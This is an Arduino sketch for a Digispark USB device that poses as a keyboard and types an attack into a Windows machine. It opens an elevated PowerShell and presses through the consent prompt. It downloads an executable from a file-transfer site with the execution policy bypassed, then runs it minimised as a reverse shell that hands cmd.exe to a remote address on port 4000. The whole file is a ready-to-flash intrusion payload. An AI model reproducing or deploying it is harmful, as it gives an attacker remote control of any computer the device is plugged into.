

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell Start-Process -FilePath  powershell -Verb RunAs ");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(80);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
  DigiKeyboard.print("cd \\; md ash; echo (powershell Invoke-WebRequest -Outfile shell.exe 'https://s23.filetransfer.io/storage/download/bzijzavh81cR') > psh.ps1 powershell -ExecutionPolicy Bypass -file psh.psh1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("START /MIN shell.exe 192.168.225.178 4000 -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("EXIT");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
    /*Stops the digispark from running the scipt again*/
  
 
  }
}
